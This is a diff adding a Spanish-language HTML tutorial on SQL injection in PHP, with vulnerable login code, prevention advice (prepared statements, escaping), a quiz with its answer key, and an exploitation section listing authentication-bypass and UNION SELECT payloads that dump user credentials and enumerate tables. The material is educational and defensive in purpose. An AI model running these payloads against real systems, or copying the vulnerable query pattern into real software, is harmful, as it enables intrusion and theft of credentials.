@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tutorial de Inyección SQL en PHP</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f4;
+        }
+        .container {
+            max-width: 800px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1, h2, h3 {
+            color: #333;
+        }
+        pre {
+            background-color: #f0f0f0;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        code {
+            background-color: #f0f0f0;
+            padding: 2px 4px;
+            border-radius: 4px;
+        }
+        #quiz {
+            margin-top: 20px;
+        }
+        .question {
+            margin-bottom: 20px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Tutorial de Inyección SQL en PHP</h1>
+        
+        <h2>¿Qué es la Inyección SQL?</h2>
+        <p>La inyección SQL es una técnica de ataque que aprovecha las vulnerabilidades en la forma en que una aplicación interactúa con su base de datos. Permite a un atacante insertar o "inyectar" código SQL malicioso en las consultas que la aplicación envía a la base de datos.</p>
+        
+        <h2>¿Por qué se produce el fallo?</h2>
+        <p>El fallo ocurre principalmente cuando la aplicación construye consultas SQL dinámicamente concatenando cadenas que incluyen datos proporcionados por el usuario sin una validación o sanitización adecuada.</p>
+        
+        <h3>Ejemplo de código vulnerable:</h3>
+        <pre><code>
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$result = mysqli_query($connection, $query);
+        </code></pre>
+        
+        <h2>Cómo detectar la vulnerabilidad</h2>
+        <p>Para detectar si una página es vulnerable a inyección SQL, puedes intentar las siguientes técnicas:</p>
+        <ul>
+            <li>Insertar una comilla simple (') en los campos de entrada y observar si produce un error.</li>
+            <li>Usar caracteres de escape SQL como -- o # para comentar el resto de la consulta.</li>
+            <li>Intentar operaciones lógicas como ' OR '1'='1 en campos de entrada.</li>
+        </ul>
+        
+        <h2>Cómo prevenir la inyección SQL</h2>
+        <p>Los programadores pueden prevenir la inyección SQL mediante las siguientes técnicas:</p>
+        <ol>
+            <li>Usar consultas parametrizadas o preparadas:
+                <pre><code>
+$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username AND password = :password');
+$stmt->execute(['username' => $username, 'password' => $password]);
+                </code></pre>
+            </li>
+            <li>Escapar caracteres especiales:
+                <pre><code>
+$username = mysqli_real_escape_string($connection, $_POST['username']);
+                </code></pre>
+            </li>
+            <li>Utilizar ORM (Object-Relational Mapping) que manejan automáticamente la sanitización.</li>
+            <li>Implementar una lista blanca de caracteres permitidos en las entradas del usuario.</li>
+            <li>Aplicar el principio de mínimo privilegio en las conexiones de base de datos.</li>
+        </ol>
+        
+        <h2>Cómo explotar una vulnerabilidad de inyección SQL</h2>
+        <p>Advertencia: Estas técnicas solo deben usarse en entornos controlados y con permiso explícito.</p>
+        
+        <h3>1. Bypass de autenticación</h3>
+        <pre><code>
+username: admin' --
+password: [cualquier cosa]
+        </code></pre>
+        <p>Esto comenta el resto de la consulta, permitiendo el acceso sin conocer la contraseña.</p>
+        
+        <h3>2. Unión de consultas para extraer datos adicionales</h3>
+        <pre><code>
+' UNION SELECT NULL, username, password FROM users --
+        </code></pre>
+        <p>Esto podría revelar nombres de usuario y contraseñas de la tabla de usuarios.</p>
+        
+        <h3>3. Obtener información sobre la estructura de la base de datos</h3>
+        <pre><code>
+' UNION SELECT NULL, table_name, NULL FROM information_schema.tables --
+        </code></pre>
+        <p>Esto podría revelar los nombres de todas las tablas en la base de datos.</p>
+        
+        <h2>Cómo ver las tablas y sus contenidos</h2>
+        <p>Una vez que se ha identificado una vulnerabilidad, se pueden usar las siguientes técnicas para explorar la base de datos:</p>
+        
+        <h3>1. Listar tablas</h3>
+        <pre><code>
+' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema = database() --
+        </code></pre>
+        
+        <h3>2. Listar columnas de una tabla específica</h3>
+        <pre><code>
+' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name = 'users' --
+        </code></pre>
+        
+        <h3>3. Extraer datos de una tabla específica</h3>
+        <pre><code>
+' UNION SELECT NULL, username, password FROM users --
+        </code></pre>
+        
+        <h2>Examen sobre Inyección SQL</h2>
+        <div id="quiz">
+            <div class="question">
+                <p>1. ¿Qué es la principal causa de las vulnerabilidades de inyección SQL?</p>
+                <input type="radio" name="q1" value="a"> a) Usar PHP para desarrollar aplicaciones web<br>
+                <input type="radio" name="q1" value="b"> b) No validar o sanitizar adecuadamente los datos de entrada del usuario<br>
+                <input type="radio" name="q1" value="c"> c) Usar bases de datos SQL en lugar de NoSQL<br>
+            </div>
+            <div class="question">
+                <p>2. ¿Cuál de las siguientes es una técnica efectiva para prevenir la inyección SQL?</p>
+                <input type="radio" name="q2" value="a"> a) Usar consultas parametrizadas<br>
+                <input type="radio" name="q2" value="b"> b) Almacenar las contraseñas en texto plano<br>
+                <input type="radio" name="q2" value="c"> c) Desactivar los mensajes de error de SQL<br>
+            </div>
+            <div class="question">
+                <p>3. En el contexto de inyección SQL, ¿qué hace el carácter '--'?</p>
+                <input type="radio" name="q3" value="a"> a) Concatena dos consultas SQL<br>
+                <input type="radio" name="q3" value="b"> b) Comenta el resto de la consulta SQL<br>
+                <input type="radio" name="q3" value="c"> c) Ejecuta la consulta SQL<br>
+            </div>
+            <div class="question">
+                <p>4. ¿Qué operación SQL se usa comúnmente para combinar el resultado de una consulta maliciosa con la consulta original?</p>
+                <input type="radio" name="q4" value="a"> a) JOIN<br>
+                <input type="radio" name="q4" value="b"> b) UNION<br>
+                <input type="radio" name="q4" value="c"> c) INTERSECT<br>
+            </div>
+            <div class="question">
+                <p>5. ¿Cuál de las siguientes NO es una forma de detectar vulnerabilidades de inyección SQL?</p>
+                <input type="radio" name="q5" value="a"> a) Insertar una comilla simple en los campos de entrada<br>
+                <input type="radio" name="q5" value="b"> b) Usar un escáner de vulnerabilidades automatizado<br>
+                <input type="radio" name="q5" value="c"> c) Revisar el código fuente de JavaScript del lado del cliente<br>
+            </div>
+            <button onclick="checkQuiz()">Enviar respuestas</button>
+        </div>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        function checkQuiz() {
+            const answers = {q1: 'b', q2: 'a', q3: 'b', q4: 'b', q5: 'c'};
+            let score = 0;
+            let total = Object.keys(answers).length;
+
+            for (let q in answers) {
+                let selected = document.querySelector(`input[name="${q}"]:checked`);
+                if (selected && selected.value === answers[q]) {
+                    score++;
+                }
+            }
+
+            let resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = `<h3>Resultado</h3><p>Has acertado ${score} de ${total} preguntas.</p>`;
+            
+            if (score === total) {
+                resultDiv.innerHTML += '<p>¡Excelente! Demuestras un sólido entendimiento de las vulnerabilidades de inyección SQL y cómo prevenirlas.</p>';
+            } else if (score > total / 2) {
+                resultDiv.innerHTML += '<p>Buen trabajo, pero hay espacio para mejorar. Revisa las áreas en las que fallaste y vuelve a estudiar el material.</p>';
+            } else {
+                resultDiv.innerHTML += '<p>Necesitas estudiar más sobre inyección SQL. Repasa el tutorial y considera buscar recursos adicionales para fortalecer tu comprensión.</p>';
+            }
+        }
+    </script>
+</body>
+</html>
